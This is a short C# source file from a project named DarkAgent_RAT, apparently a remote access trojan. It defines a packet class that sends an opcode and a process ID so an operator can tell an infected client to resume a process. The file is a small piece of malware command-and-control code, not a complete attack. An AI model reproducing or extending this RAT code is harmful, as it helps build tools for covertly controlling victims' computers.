using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    class S_ResumeProcess : SendBasePacket
    {
        private int PID;
        public S_ResumeProcess(RatClients client, int PID)
            : base(client)
        {
            this.PID = PID;
        }

        protected internal override void Write()
        {
            WriteByte(6);
            WriteInteger(PID);
        }
    }
}
